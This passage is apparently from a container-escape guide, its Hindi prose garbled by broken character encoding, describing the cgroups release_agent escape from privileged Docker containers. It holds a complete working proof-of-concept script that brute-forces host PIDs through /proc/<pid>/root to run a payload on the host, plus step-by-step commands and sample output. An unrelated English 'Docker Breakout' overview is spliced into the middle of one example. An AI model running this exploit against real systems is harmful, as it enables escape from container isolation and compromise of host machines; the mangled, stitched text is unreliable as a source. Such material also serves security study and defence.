рдЕрдм, рд╣рдо `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдпрд╣ `ps aux` рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ `/output` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдЧрд╛, рд╣реЛрд╕реНрдЯ рдкрд░ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗред рдЕрдВрдд рдореЗрдВ, рд╣рдо рднреА `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдо рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рджреЗрдЦ рд╕рдХреЗрдВ:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
рдЕрдВрдд рдореЗрдВ, рд╣рдо рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ "x" рдмрд╛рд▓ рдмрдЪреНрдЪрд╛ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рддрддреНрдХрд╛рд▓ рдЦрддреНрдо рд╣реЛ рдЬрд╛рддреА рд╣реИред "/bin/sh" рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдХрд░ рдФрд░ рдЗрд╕рдХрд╛ рдкреАрдЖрдИрдбреА "x" рдмрд╛рд▓ рдмрдЪреНрдЪрд╛ рд╕рдореВрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ `cgroup.procs` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░, рдореЗрдЬрдмрд╛рди рдкрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ `/bin/sh` рдХреЗ рдмрд╛рдж рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреАред рдореЗрдЬрдмрд╛рди рдкрд░ рдХрд┐рдП рдЧрдП `ps aux` рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдлрд┐рд░ `/output` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` рдлреНрд▓реИрдЧ v2

рдкрд┐рдЫрд▓реЗ PoCs рдареАрдХ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдХрдВрдЯреЗрдирд░ рдХреЛ рдПрдХ рд╕реНрдЯреЛрд░реЗрдЬ рдбреНрд░рд╛рдЗрд╡рд░ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХрд╛ рдкреВрд░рд╛ рд╣реЛрд╕реНрдЯ рдкрде рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `overlayfs`, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдореБрдЭреЗ рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд┐рд▓реА рдЬрд┐рдирдореЗрдВ рд╣реЛрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рдерд╛ред

## рдХрд╛рдЯрд╛ рдХрдВрдЯреЗрдирд░реНрд╕
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `9pfs` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреА рд░реВрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдХрдЯрд╛ рдХрдВрдЯреЗрдирд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕реНрдерд╛рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

\* рдХрдЯрд╛ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдПрдХ рднрд╡рд┐рд╖реНрдп рдХреЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВред

## рдбрд┐рд╡рд╛рдЗрд╕ рдореИрдкрд░
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
рдореИрдВрдиреЗ рдПрдХ рд▓рд╛рдЗрд╡ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдЗрд╕ рд░реВрдЯ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдВрдЯреЗрдирд░ рджреЗрдЦрд╛, рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ `devicemapper` рд╕реНрдЯреЛрд░реЗрдЬ-рдбреНрд░рд╛рдЗрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЗрд╕ рд╕рдордп рддрдХ рдореБрдЭреЗ рдПрдХ рдкрд░реАрдХреНрд╖рдг рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрдерддрд╛ рд╣реБрдИ рд╣реИред

## рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ PoC

рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдкрде рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреЗрд▓рд┐рдХреНрд╕ рдХреЗ PoC рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдереЛрдбрд╝реА рддрд░реНрдХрд╢рдХреНрддрд┐ рдХреЗ рд╕рд╛рде рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдЕрднреА рднреА рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХрдорд╛рддреНрд░ рдЬрд░реВрд░реА рдЬрд╛рдирдХрд╛рд░реА рдпрд╣ рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдкреВрд░рд╛ рдкрде, рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣рд┐рдПред рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рд╕реЗ рдЗрд╕реЗ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рдмрдЬрд╛рдп рд╣рдореЗрдВ рдЕрдиреНрдп рдХрд╣реАрдВ рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ред

### Proc рдХреА рдорджрдж <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

рд▓рд┐рдирдХреНрд╕ `/proc` рдкреНрд╕реЗрдбреЛ-рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд░реНрдирд▓ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛рдПрдБ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЕрд▓рдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ `/proc` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_рдПрдХ рдмрд╛рдд рдХрд╣реВрдВ, `/proc/<pid>/root` рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рдПрдХ рдРрд╕реА рдереА рдЬрд┐рд╕рдиреЗ рдореБрдЭреЗ рдмрд╣реБрдд рд╕рдордп рддрдХ рднреНрд░рдорд┐рдд рдХрд┐рдпрд╛, рдореИрдВ рдХрднреА рд╕рдордЭ рдирд╣реАрдВ рд╕рдХрд╛ рдХрд┐ `/` рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддреАрдХреА рд▓рд┐рдВрдХ рд╣реЛрдирд╛ рдХрд┐рддрдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬрдм рддрдХ рдореИрдВрдиреЗ рдореИрди рдкреЗрдЬ рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкрд░рд┐рднрд╛рд╖рдг рдХреЛ рдкрдврд╝рд╛ рдирд╣реАрдВ:_

> /proc/\[pid]/root
>
> UNIX рдФрд░ Linux рдореЗрдВ рдкреНрд░рддрд┐рдкреНрд░реЛрд╕реЗрд╕ рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХреА рдПрдХ рдкреНрд░рддрд┐ рдХреЛ рд╕рдорд░реНрдерди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ chroot(2) рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдПрдХ рдкреНрд░рддреАрдХреА рд▓рд┐рдВрдХ рд╣реИ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ, рдФрд░ exe рдФрд░ fd/\* рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
>
> рд╣рд╛рд▓рд╛рдВрдХрд┐ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рддреАрдХреА рд▓рд┐рдВрдХ рдирд╣реАрдВ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЦреБрдж рдХреА рддрд░рд╣ рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдПрдХ рд╕рдорд╛рди рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ (рдиреЗрдорд╕реНрдкреЗрд╕ рдФрд░ рдкреНрд░рддрд┐-рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдЙрдВрдЯ рдХреА рд╕реЗрдЯ рд╕рд╣рд┐рдд)ред

`/proc/<pid>/root` рдкреНрд░рддреАрдХреА рд▓рд┐рдВрдХ рдХреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рд╕рдВрдмрдВрдзрд┐рдд рдкрде рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
рдпрд╣ рдЖрдХреНрд░рдордг рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ, рдЬреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ, рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╕реЗ, рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ pid рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдмрджрд▓рддрд╛ рд╣реИред

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрд╕рд╛рди рд╣реИ, рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд▓рдЧрд╛рддрд╛рд░ рдЖрдИрдбреА рдЖрд╡рдВрдЯрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред `init` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА `1` рдХреЗ рд░реВрдк рдореЗрдВ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╕рднреА рдЖрдЧрд╛рдореА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдЖрдИрдбреА рджреА рдЬрд╛рддреА рд╣реИред рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдЦреЛрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: рдХрдВрдЯреЗрдирд░
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Docker Breakout

## Introduction

Docker is a popular containerization platform that allows you to run applications in isolated environments called containers. However, misconfigurations or vulnerabilities in Docker can lead to privilege escalation attacks, allowing an attacker to break out of the container and gain access to the underlying host system.

In this guide, we will explore various techniques that can be used to break out of a Docker container and escalate privileges on the host system.

## Docker Socket

By default, Docker communicates with the Docker daemon using a Unix socket located at `/var/run/docker.sock`. This socket file has read and write permissions for the `docker` group, allowing any user in that group to interact with the Docker daemon.

If an attacker gains access to the Docker socket, they can execute Docker commands as the `root` user, effectively bypassing any container isolation. This can be achieved through various means, such as exploiting a vulnerable container or gaining access to the host system.

To exploit this vulnerability, an attacker can mount the Docker socket inside a container and execute Docker commands from within the container. This allows them to run privileged containers, access host resources, and potentially gain root access on the host system.

## Privileged Containers

Docker allows you to run containers with elevated privileges using the `--privileged` flag. When a container is run with this flag, it has access to all devices on the host system, effectively bypassing any container isolation.

If an attacker gains access to a privileged container, they can leverage this access to escalate privileges on the host system. They can modify host files, execute arbitrary commands, and potentially gain root access.

To exploit this vulnerability, an attacker can either gain access to an existing privileged container or create a new privileged container themselves. Once inside the privileged container, they can execute commands with elevated privileges and potentially gain control over the host system.

## Container Escape

In some cases, it may be possible to escape the confines of a Docker container and gain access to the host system. This can be achieved through various means, such as exploiting kernel vulnerabilities, misconfigurations, or insecure container configurations.

If an attacker successfully escapes a Docker container, they can execute commands on the host system with the privileges of the container. This can allow them to access sensitive files, modify system configurations, and potentially gain root access on the host system.

To exploit this vulnerability, an attacker needs to identify and exploit a vulnerability or misconfiguration that allows them to break out of the container. This can be a complex process and often requires a deep understanding of the underlying system and its vulnerabilities.

## Conclusion

Privilege escalation attacks in Docker can have serious consequences, allowing an attacker to gain unauthorized access to the host system. It is important to follow security best practices when using Docker, such as restricting access to the Docker socket, avoiding the use of privileged containers, and regularly updating Docker and its dependencies to patch any vulnerabilities.

By understanding the various techniques used in Docker breakout attacks, you can better protect your Docker environments and prevent unauthorized access to your host systems.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### рд╕рдм рдХреБрдЫ рдорд┐рд▓рд╛рдХрд░ рд░рдЦрдирд╛ <a href="putting-it-all-together" id="putting-it-all-together"></a>

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП brute force рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ `/proc/<pid>/root/payload.sh` рдкрде рдХреЗ рд▓рд┐рдП pid рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдкреНрд░рддреНрдпреЗрдХ рдЕрд╡рдзрд┐ рдореЗрдВ рдЕрдиреБрдорд╛рдирд┐рдд pid рдкрде рдХреЛ cgroups `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рдП, `release_agent` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдПрдХрдорд╛рддреНрд░ рд╕рд╛рд╡рдзрд╛рдиреА рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдЫрд┐рдкрд╛ рд╣реБрдЖ рдирд╣реАрдВ рд╣реИ, рдФрд░ pid рдЧрд┐рдирддреА рдХреЛ рдмрд╣реБрдд рдКрдБрдЪрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЪрд▓рд╛рдИ рдирд╣реАрдВ рдЬрд╛рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рдХрд╛рд░рдг рдирд╣реАрдВ рдмрдиреЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЗрд╕ рдкрд░ рдореБрдЭреЗ рди рд▓рд┐рдЦреЗрдВред

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП PoC рдореЗрдВ рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЕрдорд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ cgroups `release_agent` рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣рдорд▓рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдПрдХ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ PoC рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рдЗрд╕рдХреЗ рд╕рдорд╛рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc рдЕрдкрд╢рд┐рд╖реНрдЯ (CVE-2019-5736)

